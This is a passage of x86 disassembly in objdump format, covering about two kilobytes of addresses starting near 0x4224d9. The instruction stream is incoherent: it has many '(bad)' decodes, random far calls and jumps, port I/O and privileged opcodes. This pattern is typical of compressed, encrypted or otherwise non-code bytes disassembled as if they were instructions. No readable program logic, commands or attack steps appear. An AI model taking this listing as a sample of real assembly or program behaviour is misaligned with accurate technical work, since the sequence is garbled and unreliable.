  4224d9:	add    BYTE PTR [eax+0x2379683b],cl
  4224df:	nop
  4224e0:	add    al,0x76
  4224e2:	sar    DWORD PTR [ebp-0x5b],cl
  4224e5:	stos   BYTE PTR es:[edi],al
  4224e6:	dec    esp
  4224e7:	clc    
  4224e8:	pop    ebp
  4224e9:	push   es
  4224ea:	test   esp,esp
  4224ec:	sub    DWORD PTR [edi-0x52b079de],ebx
  4224f2:	cwde   
  4224f3:	ficom  WORD PTR [edx-0x3ee81d3e]
  4224f9:	dec    ebx
  4224fa:	(bad)  
  4224fb:	push   edx
  4224fc:	jl     0x422507
  4224fe:	xlat   BYTE PTR ds:[ebx]
  4224ff:	lahf   
  422500:	adc    ch,BYTE PTR [ebx]
  422502:	and    bh,0x81
  422505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422506:	push   ds
  422507:	inc    esi
  422508:	mov    ah,0x64
  42250a:	push   edi
  42250b:	jmp    0x700:0x197668d4
  422512:	dec    ebx
  422513:	sub    edx,ebx
  422515:	or     DWORD PTR [eax+0x1bd0ebb9],0x89fa0e9
  42251f:	clc    
  422520:	ret    0x276a
  422523:	es xor eax,0x679706bc
  422529:	jne    0x4224d0
  42252b:	imul   ecx,DWORD PTR [ebp-0x1f],0x43
  42252f:	shl    BYTE PTR ds:0x61608e64,1
  422535:	push   esp
  422536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422537:	and    bl,bl
  422539:	mov    edx,0x336da565
  42253e:	stc    
  42253f:	mov    esp,0xa409eb0e
  422544:	mov    dl,0xf
  422546:	xchg   ebp,eax
  422547:	pushf  
  422548:	js     0x422518
  42254a:	sbb    al,0x1
  42254c:	jne    0x4224ee
  42254e:	sub    al,0x14
  422550:	(bad)  
  422551:	das    
  422552:	cmp    esp,DWORD PTR [ecx-0x68a8e384]
  422558:	test   DWORD PTR [ebx+ecx*8],ebx
  42255b:	ins    BYTE PTR es:[edi],dx
  42255c:	push   ds
  42255d:	lods   eax,DWORD PTR ds:[esi]
  42255e:	imul   esi,DWORD PTR [ebp+0x6550e3e3],0xbd3fba9f
  422568:	jns    0x4225bb
  42256a:	dec    ebp
  42256b:	adc    edx,edx
  42256d:	popf   
  42256e:	fisub  WORD PTR [ebx]
  422570:	add    BYTE PTR [eax],dl
  422572:	shl    BYTE PTR [esi],0x68
  422575:	stos   DWORD PTR es:[edi],eax
  422576:	push   ebx
  422577:	call   0xa380:0xffed5eed
  42257e:	xor    ecx,DWORD PTR [ebx]
  422580:	sbb    eax,DWORD PTR ds:0x1ab6bd5d
  422586:	add    eax,0x4fbbc416
  42258b:	mov    bl,0x98
  42258d:	aaa    
  42258e:	fs mov bl,0xfc
  422591:	fld    QWORD PTR [edi-0x6e3d390c]
  422597:	dec    ebx
  422598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422599:	push   eax
  42259a:	jmp    0xe69b:0x669da2c7
  4225a1:	inc    ecx
  4225a2:	es lahf 
  4225a4:	jp     0x42253c
  4225a6:	pop    ebp
  4225a7:	ins    BYTE PTR es:[edi],dx
  4225a8:	xor    al,0x3f
  4225aa:	mov    edx,ecx
  4225ac:	push   cs
  4225ad:	cmp    al,0xd8
  4225af:	inc    edx
  4225b0:	or     al,0xf7
  4225b2:	mov    cl,0xbd
  4225b4:	jl     0x422551
  4225b6:	rol    bl,0xe7
  4225b9:	mov    eax,ds:0x464ebb04
  4225be:	pop    ebx
  4225bf:	popf   
  4225c0:	rcl    DWORD PTR [ebx],0xbc
  4225c3:	int3   
  4225c4:	and    esp,ecx
  4225c6:	mul    BYTE PTR [bp+0x2382]
  4225cb:	xchg   edi,eax
  4225cc:	sbb    BYTE PTR [ebp+0x2cd69ba7],ch
  4225d2:	(bad)
  4225d6:	or     BYTE PTR [ebx],dl
  4225d8:	lahf   
  4225d9:	cmp    eax,DWORD PTR [edx-0x16]
  4225dc:	sbb    ecx,DWORD PTR [edx-0x3a]
  4225df:	jge    0x4225b3
  4225e1:	popf   
  4225e2:	jns    0x422631
  4225e4:	sahf   
  4225e5:	or     BYTE PTR [esi-0x7f683ea2],0x23
  4225ec:	sbb    dh,BYTE PTR [edi+0x333b2c27]
  4225f2:	shl    BYTE PTR [esi+0x68b289e1],cl
  4225f8:	retf   0xbaaf
  4225fb:	cmp    DWORD PTR [edx+edi*4-0x7],ebp
  4225ff:	push   ebx
  422600:	dec    esp
  422601:	outs   dx,BYTE PTR ds:[esi]
  422602:	data16 sub dl,al
  422605:	add    esp,eax
  422607:	jg     0x42261c
  422609:	retf   0xf70c
  42260c:	and    BYTE PTR [edi+edi*1],ah
  42260f:	test   DWORD PTR [eax+0x56],edi
  422612:	ret    
  422613:	pop    ebx
  422614:	ja     0x4225a8
  422616:	or     BYTE PTR [eax],0x88
  422619:	xor    bh,cl
  42261b:	or     al,0x42
  42261d:	push   cs
  42261e:	in     al,0xa9
  422620:	fiadd  WORD PTR ds:0x4394fb5d
  422626:	rol    DWORD PTR ds:0x763cb4fa,1
  42262c:	or     esi,DWORD PTR [edi+0x1a]
  42262f:	jp     0x4225c9
  422631:	jne    0x4225e1
  422633:	imul   ecx,esi,0xff8064bf
  422639:	jp     0x42267b
  42263b:	mov    al,0xd9
  42263d:	xchg   edx,eax
  42263e:	pop    es
  42263f:	xor    BYTE PTR [ebx+0x733f2d27],bh
  422645:	popf   
  422646:	fsub   DWORD PTR ds:0x8a4bd939
  42264c:	inc    esi
  42264d:	pop    eax
  42264e:	inc    edx
  42264f:	mov    bl,BYTE PTR [eax+ebx*4-0x61]
  422653:	stos   DWORD PTR es:[edi],eax
  422654:	xchg   DWORD PTR [eax],ebx
  422656:	fst    DWORD PTR [ebx]
  422658:	sbb    cl,cl
  42265a:	aad    0x70
  42265c:	(bad)  [edx]
  42265e:	(bad)  
  42265f:	jg     0x42267d
  422661:	adc    DWORD PTR [esi-0x1651b441],0x63
  422668:	das    
  422669:	inc    ebp
  42266a:	xchg   edi,eax
  42266b:	retf   0x442b
  42266e:	fs or  bh,ch
  422671:	icebp  
  422672:	xor    esi,DWORD PTR [ecx]
  422674:	out    0x47,eax
  422676:	mov    es,WORD PTR [edi]
  422678:	sub    ah,BYTE PTR [esi]
  42267a:	mul    BYTE PTR [ecx-0x5ba68ba]
  422680:	cmp    eax,0x31a168d8
  422685:	jp     0x4226e2
  422687:	call   0x5330da2f
  42268c:	fs mov ah,0x39
  42268f:	jbe    0x4226e2
  422691:	inc    edx
  422692:	jecxz  0x4226f7
  422694:	push   esp
  422695:	cmp    BYTE PTR [edi+0x16],0x9a
  422699:	std    
  42269a:	adc    edi,ebp
  42269c:	pop    edi
  42269d:	dec    esp
  42269e:	xor    BYTE PTR [ebx-0x61],0x73
  4226a2:	(bad)  
  4226a3:	ss in  al,dx
  4226a5:	fs mov ebx,0xda029a7e
  4226ab:	push   ebx
  4226ac:	icebp  
  4226ad:	mov    ecx,0x81a2c95b
  4226b2:	or     al,0x4e
  4226b4:	jl     0x4226c4
  4226b6:	pop    edi
  4226b7:	or     DWORD PTR [edi],eax
  4226b9:	push   ebp
  4226ba:	cwde   
  4226bb:	sti    
  4226bc:	call   0x50f5:0xb9388b36
  4226c3:	outs   dx,BYTE PTR ds:[esi]
  4226c4:	clc    
  4226c5:	lds    edi,FWORD PTR [eax]
  4226c7:	adc    eax,0x8b000fc7
  4226cc:	cmp    eax,0x33fb0f88
  4226d1:	popf   
  4226d2:	cmc    
  4226d3:	push   ss
  4226d4:	sbb    eax,0x36957d8d
  4226d9:	shr    DWORD PTR [ecx+0xf],cl
  4226dc:	into   
  4226dd:	test   ebx,0x8555e49d
  4226e3:	lahf   
  4226e4:	xchg   esp,eax
  4226e5:	pusha  
  4226e6:	dec    edi
  4226e7:	push   esp
  4226e8:	mov    edi,ebx
  4226ea:	das    
  4226eb:	inc    eax
  4226ec:	aam    0xeb
  4226ee:	adc    BYTE PTR [esi+0x89d03c3],0x79
  4226f5:	(bad)  
  4226f6:	into   
  4226f7:	mov    al,0xf7
  4226f9:	xchg   DWORD PTR [esi],ebx
  4226fb:	push   cs
  4226fc:	xchg   edi,eax
  4226fd:	add    edx,DWORD PTR [ebx]
  4226ff:	ret    
  422700:	setp   BYTE PTR ds:[ecx+0x50]
  422705:	das    
  422706:	mov    BYTE PTR [eax+0x10c6d19d],ah
  42270c:	sub    BYTE PTR [ecx-0x5],ch
  42270f:	and    BYTE PTR [ecx],ah
  422711:	jbe    0x422789
  422713:	fisttp WORD PTR [ebx+edx*1+0x3c3bf2fb]
  42271a:	stos   DWORD PTR es:[edi],eax
  42271b:	jns    0x42276f
  42271d:	(bad)  
  42271f:	mov    DWORD PTR [ecx-0x6454256f],eax
  422725:	pop    es
  422726:	xchg   edx,eax
  422727:	push   ebx
  422728:	aad    0x51
  42272a:	mov    dh,0x19
  42272c:	xchg   dh,ch
  42272e:	xchg   edx,eax
  42272f:	imul   edi,DWORD PTR [eax-0x46],0xc519b67d
  422736:	push   ebx
  422737:	xor    dl,BYTE PTR [ebx-0x154ac88b]
  42273d:	js     0x422723
  42273f:	cli    
  422740:	and    eax,0x55ddcdd5
  422745:	lods   eax,DWORD PTR ds:[esi]
  422746:	push   edx
  422747:	xor    DWORD PTR [ecx-0x11cf6e4b],esi
  42274d:	and    esp,DWORD PTR [eax+0x24]
  422750:	in     al,dx
  422751:	mov    DWORD PTR [esi],ebp
  422753:	retf   
  422754:	out    dx,al
  422755:	and    al,0x91
  422757:	add    BYTE PTR [eax],al
  422759:	jp     0x422704
  42275b:	shl    BYTE PTR [edi],1
  42275d:	aam    0x54
  42275f:	mov    bh,0x19
  422761:	lods   eax,DWORD PTR ds:[esi]
  422762:	and    BYTE PTR [ecx-0x12],ah
  422765:	popf   
  422766:	xor    cl,0x9
  422769:	add    ebx,DWORD PTR [edx-0x5578c7f]
  42276f:	pop    eax
  422770:	mov    esi,0x8d8628ea
  422775:	xor    al,0xa8
  422777:	push   esi
  422778:	imul   ebx,DWORD PTR [ecx+eiz*2+0x222c3816],0xecfaec0f
  422783:	sar    DWORD PTR [esi-0x2a4d6f88],1
  422789:	sti    
  42278a:	addr16 retf 
  42278c:	fisttp QWORD PTR [edi]
  42278e:	(bad)  [esi-0x3d879c4b]
  422794:	mov    dh,BYTE PTR [edi-0x4d]
  422797:	call   0xfd38:0xf6b1c2a4
  42279e:	jns    0x42274d
  4227a0:	jnp    0x42274b
  4227a2:	call   0x6a7850bf
  4227a7:	xchg   esi,eax
  4227a8:	mov    ch,0xef
  4227aa:	sbb    DWORD PTR [esi+0x66],edi
  4227ad:	je     0x422782
  4227af:	xchg   esi,eax
  4227b0:	and    eax,0xfc486c84
  4227b5:	test   DWORD PTR [edi],0xf608b462
  4227bb:	push   es
  4227bc:	aaa    
  4227bd:	lods   eax,DWORD PTR ds:[esi]
  4227be:	adc    ebx,esi
  4227c0:	xor    ebx,DWORD PTR [edx+0x2e96dd57]
  4227c6:	not    ah
  4227c8:	xor    eax,0xecfa9004
  4227cd:	aas    
  4227ce:	add    eax,0xb19da541
  4227d3:	adc    ebp,DWORD PTR [edi+0x6d24efdb]
  4227d9:	shr    ah,0xdf
  4227dc:	and    BYTE PTR [ecx],dh
  4227de:	jecxz  0x42282a
  4227e0:	ret    0x3a72
  4227e3:	call   0x8df8:0x7ec32fc5
  4227ea:	dec    esi
  4227eb:	xchg   BYTE PTR [edx+0x49869682],bh
  4227f1:	push   cs
  4227f2:	ret    
  4227f3:	call   0x8d1d49d8
  4227f8:	ror    BYTE PTR [ecx+0x1f243b3f],0xa5
  4227ff:	adc    al,0x21
  422801:	pusha  
  422802:	mov    bl,0xe1
  422804:	enter  0x3267,0x93
  422808:	ins    DWORD PTR es:[edi],dx
  422809:	pop    esi
  42280a:	xchg   ebx,eax
  42280b:	call   FWORD PTR [edx]
  42280d:	sub    dh,ch
  42280f:	or     edi,DWORD PTR [eax-0x11]
  422812:	std    
  422813:	loopne 0x4227a4
  422815:	loopne 0x422890
  422817:	add    eax,0xd83a8494
  42281c:	pop    ebx
  42281d:	bound  ebp,QWORD PTR [ebx]
  42281f:	js     0x422890
  422821:	mov    DWORD PTR [edx-0x77a7c594],ecx
  422827:	in     al,0x4c
  422829:	lods   eax,DWORD PTR ds:[esi]
  42282a:	and    bl,BYTE PTR [edi+0x14]
  42282d:	test   DWORD PTR [eax+0x59],ebx
  422830:	mov    ebp,0x24cc17e4
  422835:	adc    esp,DWORD PTR [edi]
  422837:	das    
  422838:	stos   BYTE PTR es:[edi],al
  422839:	sti    
  42283a:	call   FWORD PTR [ecx]
  42283c:	cmp    BYTE PTR ds:0x20b5a58b,0x35
  422843:	rcr    DWORD PTR [eax],cl
  422845:	popa   
  422846:	cmp    eax,0x11adffa6
  42284b:	dec    ebx
  42284c:	and    eax,0xae34e07
  422851:	daa    
  422852:	mov    ch,0x94
  422854:	leave  
  422855:	mov    ch,0xe
  422857:	mov    edi,0x9f2e7d9c
  42285c:	adc    BYTE PTR [edx],ch
  42285e:	mov    al,ds:0x4d2691c2
  422863:	lock out 0x59,eax
  422866:	bound  ebx,QWORD PTR [eax]
  422868:	adc    al,0xad
  42286a:	je     0x422818
  42286c:	out    0xc3,al
  42286e:	mov    ch,0x10
  422870:	scas   al,BYTE PTR es:[edi]
  422871:	in     eax,0x1f
  422873:	out    0xf8,eax
  422875:	(bad)  [eax+esi*4+0x74]
  422879:	out    dx,al
  42287a:	mov    al,0x35
  42287c:	xchg   ecx,eax
  42287d:	out    dx,eax
  42287e:	ss mov ch,0x37
  422881:	sub    eax,DWORD PTR [eax-0x4a]
  422884:	xchg   edi,eax
  422885:	add    bh,ch
  422887:	dec    eax
  422888:	aaa    
  422889:	jle    0x422906
  42288b:	fnsave [ebp-0x68991edd]
  422891:	inc    esi
  422892:	mov    al,ds:0x293023f3
  422897:	imul   edi,DWORD PTR [edi-0x7b6cdea],0x9a04370d
  4228a1:	add    edi,0xfffffff2
  4228a4:	jmp    0x422871
  4228a6:	in     al,0xe7
  4228a8:	in     al,dx
  4228a9:	sub    ebp,DWORD PTR [eax]
  4228ab:	sar    DWORD PTR [edi+0x30],1
  4228ae:	outs   dx,DWORD PTR ds:[esi]
  4228af:	cmp    BYTE PTR [edi-0x5e],bl
  4228b2:	adc    edi,DWORD PTR [edi]
  4228b4:	popf   
  4228b5:	push   ss
  4228b6:	(bad)  
  4228b7:	daa    
  4228b8:	inc    ecx
  4228b9:	jg     0x42290d
  4228bb:	call   0x81e1792d
  4228c0:	mov    ebx,0x59e99043
  4228c5:	push   ecx
  4228c6:	jae    0x422902
  4228c8:	cs jb  0x422899
  4228cb:	retf   0xd632
  4228ce:	sbb    eax,0xbd9e68c7
  4228d3:	inc    edi
  4228d4:	xor    cl,BYTE PTR [eax+0x47096d4c]
  4228da:	mov    esp,0x8058476a
  4228df:	sub    eax,0xe4d788ef
  4228e4:	or     DWORD PTR [esp+ecx*2],edx
  4228e7:	shl    edi,0x71
  4228ea:	aam    0x99
  4228ec:	inc    ebx
  4228ed:	loopne 0x422924
  4228ef:	xchg   esi,eax
  4228f0:	das    
  4228f1:	stos   DWORD PTR es:[edi],eax
  4228f2:	ss dec edi
  4228f4:	push   ecx
  4228f5:	(bad)  
  4228f6:	pop    esp
  4228f7:	or     eax,0x8bf4ea69
  4228fc:	push   ebp
  4228fd:	push   esi
  4228fe:	sbb    BYTE PTR [esi-0x54],0x19
  422902:	cmp    cl,dl
  422904:	cld    
  422905:	pushf  
  422906:	loop   0x4228dd
  422908:	sahf   
  422909:	mov    ds:0x8d76e8b5,al
  42290e:	xchg   DWORD PTR [esi+0x3081efce],esi
  422914:	mov    dh,BYTE PTR ds:[esp+ebx*8]
  422918:	mov    eax,ds:0x2fa26a85
  42291d:	or     al,0x21
  42291f:	ja     0x4228da
  422921:	das    
  422922:	sub    esi,DWORD PTR [eax-0x4d]
  422925:	jge    0x42290f
  422927:	inc    ecx
  422928:	ret    
  422929:	push   ebp
  42292a:	mov    bh,0x47
  42292c:	arpl   WORD PTR [eax+0x5353abf3],bp
  422932:	pushf  
  422933:	mov    ds:0xea347300,al
  422938:	or     DWORD PTR ds:0xcc8a3682,esi
  42293e:	test   BYTE PTR [ebx+0x11],bl
  422941:	sub    DWORD PTR [esi],ecx
  422943:	pop    ds
  422944:	mov    bl,0x81
  422946:	sub    al,0x7e
  422948:	and    DWORD PTR [eax],esp
  42294a:	std    
  42294b:	lds    ebx,FWORD PTR [esi-0x5296e3a1]
  422951:	pop    ebp
  422952:	adc    DWORD PTR [edi],esi
  422954:	stos   BYTE PTR es:[edi],al
  422955:	xchg   esi,eax
  422956:	inc    ecx
  422957:	cs enter 0x244c,0x13
  42295c:	mov    al,al
  42295e:	jle    0x4229d0
  422960:	sbb    ebp,DWORD PTR [edx-0x3af84df4]
  422966:	mov    ds:0x6e0f1f8e,ax
  42296c:	iret   
  42296d:	ss add eax,0xd821c319
  422973:	icebp  
  422974:	add    al,al
  422976:	push   ss
  422977:	sub    cl,BYTE PTR [esi]
  422979:	sti    
  42297a:	clc    
  42297b:	push   es
  42297c:	inc    eax
  42297d:	mov    al,ds:0x70ca577c
  422982:	xchg   BYTE PTR [esi+eiz*8-0x1d],dl
  422986:	or     al,0x99
  422988:	push   eax
  422989:	pop    esi
  42298a:	jae    0x4229f3
  42298c:	loopne 0x422910
  42298e:	das    
  42298f:	mov    ch,0x68
  422991:	jns    0x42295b
  422993:	(bad)  
  422994:	sar    BYTE PTR [ebp+0x2e],0xb6
  422998:	inc    esi
  422999:	imul   edx,DWORD PTR [esi-0x2c],0xffffffca
  42299d:	aad    0x3
  42299f:	into   
  4229a0:	pusha  
  4229a1:	add    DWORD PTR [ebx],edx
  4229a3:	cld    
  4229a4:	or     ah,BYTE PTR [ecx-0x67]
  4229a7:	mov    WORD PTR [esi],ss
  4229a9:	cmp    esp,ebp
  4229ab:	xchg   DWORD PTR [esi],ebp
  4229ad:	dec    ebp
  4229ae:	(bad)  
  4229af:	push   edx
  4229b0:	mov    ah,0xc3
  4229b2:	inc    esi
  4229b3:	mov    eax,ds:0xb2f4f371
  4229b8:	cmp    BYTE PTR [ebx-0x64033903],al
  4229be:	fs inc esi
  4229c0:	pop    edi
  4229c1:	retf   
  4229c2:	icebp  
  4229c3:	sbb    al,0x5c
  4229c5:	mov    dl,0xe6
  4229c7:	inc    ebx
  4229c8:	push   eax
  4229c9:	inc    eax
  4229ca:	ret    
  4229cb:	sbb    eax,0x4008a81c
  4229d0:	xchg   BYTE PTR [edx+0x2c],bl
  4229d3:	fidivr DWORD PTR [edi+0x7a0dfdc3]
  4229d9:	or     BYTE PTR [ecx-0x49],0xf1
  4229dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229de:	add    eax,0x81eb767b
  4229e3:	call   0x2f1b:0x421cf023
  4229ea:	mov    eax,0x3f74c44d
  4229ef:	std    
  4229f0:	jmp    0x4229fb
  4229f2:	test   al,0xe1
  4229f4:	int    0xf6
  4229f6:	inc    ecx
  4229f7:	push   ebp
  4229f8:	mov    eax,ds:0xd63c79f2
  4229fd:	nop
  4229fe:	cmp    BYTE PTR [eax+0x7d],dh
  422a01:	retf   
  422a02:	add    BYTE PTR [edx+0x43c1f7b3],0x60
  422a09:	loope  0x4229e6
  422a0b:	push   ds
  422a0c:	adc    DWORD PTR [ebx+0x42],eax
  422a0f:	data16 gs aad 0xc4
  422a13:	adc    eax,0xbaa094a6
  422a18:	pushf  
  422a19:	sbb    eax,0x300a59e9
  422a1e:	adc    DWORD PTR [edi+esi*8+0x42c2b071],ebp
  422a25:	sub    al,0x84
  422a27:	mov    bl,0x5d
  422a29:	pop    es
  422a2a:	inc    eax
  422a2b:	sbb    al,bl
  422a2d:	shr    DWORD PTR [ecx+eax*2-0x135dc634],0x3d
  422a35:	repz add eax,0x60136329
  422a3b:	mov    al,ds:0xe0aff3e5
  422a40:	lea    esi,[edi-0x1b07fbc9]
  422a46:	shr    BYTE PTR [ebp-0x6e],1
  422a49:	inc    ecx
  422a4a:	inc    ebx
  422a4b:	rcl    BYTE PTR [edx-0x40283cb4],cl
  422a51:	xor    DWORD PTR [eax-0x71],0xffffff89
  422a55:	adc    ah,BYTE PTR ss:[esi-0x28]
  422a59:	sub    dh,BYTE PTR [eax+esi*1]
  422a5c:	cmc    
  422a5d:	cwde   
  422a5e:	add    al,0xcd
  422a60:	inc    esi
  422a61:	mov    ds:0x47b24f35,eax
  422a66:	push   edx
  422a67:	inc    ebx
  422a68:	push   ss
  422a69:	stos   DWORD PTR es:[edi],eax
  422a6a:	(bad)  
  422a6b:	leave  
  422a6c:	scas   al,BYTE PTR es:[edi]
  422a6d:	push   es
  422a6e:	and    cl,BYTE PTR [eax]
  422a70:	or     esi,edi
  422a72:	mov    edi,?
  422a74:	stos   DWORD PTR es:[edi],eax
  422a75:	add    edx,DWORD PTR [eax-0xa685bd1]
  422a7b:	std    
  422a7c:	das    
  422a7d:	mov    ch,0x54
  422a7f:	xchg   edx,esi
  422a81:	dec    ecx
  422a82:	jmp    eax
  422a84:	push   ds
  422a85:	mov    dh,0xda
  422a87:	pop    eax
  422a88:	dec    esp
  422a89:	jle    0x422aa6
  422a8b:	inc    edx
  422a8c:	mov    ecx,0x20152434
  422a91:	imul   ecx,DWORD PTR [ebx],0x7ef887e3
  422a97:	aad    0xe8
  422a99:	xlat   BYTE PTR ds:[ebx]
  422a9a:	loop   0x422aa8
  422a9c:	(bad)  
  422a9d:	jo     0x422b03
  422a9f:	test   al,0xd3
  422aa1:	dec    ebp
  422aa2:	ins    BYTE PTR es:[edi],dx
  422aa3:	ins    DWORD PTR es:[edi],dx
  422aa4:	push   esp
  422aa5:	(bad)  
  422aa6:	adc    eax,0x91616a0f
  422aab:	int3   
  422aac:	out    dx,al
  422aad:	test   DWORD PTR [esi],edi
  422aaf:	push   es
  422ab0:	sbb    al,0xbb
  422ab2:	adc    al,0x6c
  422ab4:	cmc    
  422ab5:	dec    esp
  422ab6:	sbb    BYTE PTR [ebx],0x5f
  422ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aba:	jbe    0x422b1f
  422abc:	enter  0x710,0x96
  422ac0:	(bad)  
  422ac1:	int3   
  422ac2:	xor    BYTE PTR [esi+0x3177d03c],cl
  422ac8:	xchg   DWORD PTR ds:[esp+ecx*2],edx
  422acc:	ins    DWORD PTR es:[edi],dx
  422acd:	or     al,BYTE PTR [edx]
  422acf:	out    dx,al
  422ad0:	cmp    DWORD PTR [edi-0x67a9122b],ebp
  422ad6:	inc    ebp
  422ad7:	jbe    0x422a6a
  422ad9:	mov    ah,0x8d
  422adb:	retf   
  422adc:	add    dl,BYTE PTR [eax-0x400080f9]
  422ae2:	and    dl,al
  422ae4:	mov    bh,0xe1
  422ae6:	xchg   ebp,eax
  422ae7:	pop    esp
  422ae8:	adc    al,0xd9
  422aea:	add    al,0x7b
  422aec:	jo     0x422b0f
  422aee:	lss    ebx,FWORD PTR [eax]
  422af1:	mov    ebx,0x9ad3d385
  422af6:	add    BYTE PTR [ebx+0x79],bh
  422af9:	fsubr  DWORD PTR [ecx+0x4f]
  422afc:	(bad)  
  422afd:	or     ebx,ebx
  422aff:	out    0x9b,al
  422b01:	sub    DWORD PTR [esi-0x4c05d95f],ebx
  422b07:	pop    esi
  422b08:	js     0x422b84
  422b0a:	push   eax
  422b0b:	mov    eax,0xd34ce264
  422b10:	sub    DWORD PTR [esi+0x5fd7ddc5],ebx
  422b16:	sahf   
  422b17:	daa    
  422b18:	ds adc eax,0xd2e1bd98
  422b1e:	pop    esp
  422b1f:	xchg   esp,eax
  422b20:	mov    esi,DWORD PTR [ebp+ebx*8+0x2e]
  422b24:	popf   
  422b25:	jl     0x422ae2
  422b27:	test   BYTE PTR [esi-0x493c0abc],0xe9
  422b2e:	xor    eax,0xf882865a
  422b33:	(bad)  
  422b34:	pop    esi
  422b35:	fsubr  DWORD PTR [eax]
  422b37:	xchg   ecx,eax
  422b38:	adc    DWORD PTR es:[esi],edx
  422b3b:	xchg   ebp,ebp
  422b3d:	sahf   
  422b3e:	mov    bh,0x37
  422b40:	cwde   
  422b41:	xor    al,0x59
  422b43:	daa    
  422b44:	mov    ah,0x1c
  422b46:	inc    ebx
  422b47:	mov    edi,0x246e4719
  422b4c:	dec    esp
  422b4d:	div    BYTE PTR [edi+edx*8]
  422b50:	and    eax,0x2432e88d
  422b55:	jge    0x422b40
  422b57:	push   0x98c642c
  422b5c:	mov    dh,0xb6
  422b5e:	sbb    dh,bl
  422b60:	int    0x29
  422b62:	jmp    0xed84d080
  422b67:	(bad)  
  422b68:	cld    
  422b69:	outs   dx,BYTE PTR ds:[esi]
  422b6a:	outs   dx,DWORD PTR ds:[esi]
  422b6b:	cmp    BYTE PTR [edx+0x11],ah
  422b6e:	dec    edx
  422b6f:	jle    0x422bed
  422b71:	jecxz  0x422afd
  422b73:	inc    ecx
  422b74:	int3   
  422b75:	or     esp,DWORD PTR [ebx-0x7a]
  422b78:	out    dx,al
  422b79:	push   ds
  422b7a:	mov    ebx,0x79a5d9b3
  422b7f:	dec    esp
  422b80:	mov    ?,edi
  422b82:	lods   eax,DWORD PTR ds:[esi]
  422b83:	sbb    dl,BYTE PTR [ecx+eax*1-0x50]
  422b87:	jge    0x422bc5
  422b89:	xchg   esp,eax
  422b8a:	xchg   esi,eax
  422b8b:	sar    BYTE PTR [ebx],1
  422b8d:	je     0x422baf
  422b8f:	pop    esi
  422b90:	xchg   DWORD PTR [ebx-0x6f22ce89],edi
  422b96:	dec    eax
  422b97:	outs   dx,BYTE PTR ds:[esi]
  422b98:	das    
  422b99:	stos   BYTE PTR es:[edi],al
  422b9a:	inc    edx
  422b9b:	sbb    DWORD PTR [ebx+ebx*4-0x7a],edx
  422b9f:	adc    al,al
  422ba1:	popf   
  422ba2:	and    ah,BYTE PTR [edi+0x31]
  422ba5:	sub    ah,ch
  422ba7:	(bad)  
  422ba8:	push   edi
  422ba9:	ficomp WORD PTR [eax]
  422bab:	sbb    esp,DWORD PTR [ebp+0x7f38d689]
  422bb1:	frstor [edx+0x51]
  422bb4:	ret    
  422bb5:	push   edx
  422bb6:	lea    edx,[ebx-0x7c033895]
  422bbc:	mov    eax,0xab03ea4
  422bc1:	push   0xffffff9f
  422bc3:	jg     0x422bd6
  422bc5:	push   ss
  422bc6:	jmp    0xc0b4b6ce
  422bcb:	imul   eax,DWORD PTR [esi],0xe69ddae6
  422bd1:	push   cs
  422bd2:	retf   0xe657
  422bd5:	xchg   ebx,eax
  422bd6:	outs   dx,DWORD PTR ds:[esi]
  422bd7:	out    dx,al
  422bd8:	pop    esi
  422bd9:	clc    
  422bda:	fild   QWORD PTR [ecx+0x2a0b49e2]
  422be0:	jmp    0x9e5a9490
  422be5:	(bad)  
  422be6:	repnz bound eax,QWORD PTR [esi]
  422be9:	sbb    esi,esp
  422beb:	shl    bl,cl
  422bed:	lods   eax,DWORD PTR gs:[esi]
  422bef:	push   edi
  422bf0:	repz enter 0x2764,0x11
  422bf5:	pop    esi
  422bf6:	jecxz  0x422c03
  422bf8:	hlt    
  422bf9:	cld    
  422bfa:	push   0x36d9d274
  422bff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c01:	cwde   
  422c02:	test   ch,ah
  422c04:	pop    edi
  422c05:	test   eax,0x9e67c5f1
  422c0a:	xchg   BYTE PTR [eax+0xa2c5cf6],ah
  422c10:	sub    ch,al
  422c12:	je     0x422bbb
  422c14:	jae    0x422bdd
  422c16:	or     ecx,edi
  422c18:	xchg   ebp,eax
  422c19:	xor    ah,BYTE PTR [esi-0x65]
  422c1c:	test   BYTE PTR [ecx-0x37],al
  422c1f:	mov    dl,0xd8
  422c21:	in     eax,dx
  422c22:	jg     0x422ba8
  422c24:	xchg   esp,eax
  422c25:	push   0x54
  422c27:	nop
  422c28:	call   0x63fe314d
  422c2d:	or     al,0xf9
  422c2f:	sbb    BYTE PTR [esi-0x2bca5bfc],ah
  422c35:	dec    eax
  422c36:	pushf  
  422c37:	(bad)  
  422c38:	(bad)  
  422c39:	mov    ebx,0x3accafb0
  422c3e:	adc    bh,bh
  422c40:	mov    DWORD PTR [ecx+0x4b8ba34a],eax
  422c46:	mov    ds:0x3cc3db87,eax
  422c4b:	add    BYTE PTR [edi],0xb6
  422c4e:	aaa    
  422c4f:	xor    cl,BYTE PTR [eax-0x611d3a61]
  422c55:	xchg   ebx,eax
  422c56:	jo     0x422c37
  422c58:	cmp    al,0xaa
  422c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c5b:	ficomp WORD PTR [esi]
  422c5d:	inc    esi
  422c5e:	cmc    
  422c5f:	adc    edx,DWORD PTR [edx+eiz*2-0x4d]
  422c63:	(bad)  
  422c64:	frstor [esp+ecx*1+0x5d9c91f0]
  422c6b:	sar    BYTE PTR [ebx+0x20],cl
  422c6e:	into   
  422c6f:	xchg   edx,eax
  422c70:	mov    esi,0xb5e6aaf6
  422c75:	iret   
  422c76:	sub    bh,dh
  422c78:	call   0xd3d4:0x80a65647
  422c7f:	lock sbb eax,0x1ac403c1
  422c85:	jns    0x422cbe
  422c87:	inc    edx
  422c88:	lock cli 
  422c8a:	mov    ch,0xdc
  422c8c:	xor    DWORD PTR [ecx+0x70227af5],0x7e5c5e74
  422c96:	in     eax,0xe
  422c98:	hlt    
  422c99:	or     DWORD PTR [esi+0x4],esp
  422c9c:	pop    edx
  422c9d:	in     al,0x73
  422c9f:	(bad)  
  422ca0:	cmp    eax,0x49164441
  422ca5:	es lahf 
  422ca7:	inc    esi
  422ca8:	mov    ds:0x31b747c1,eax
  422cad:	out    dx,eax
  422cae:	mov    bh,0xa3
  422cb0:	loop   0x422cfa
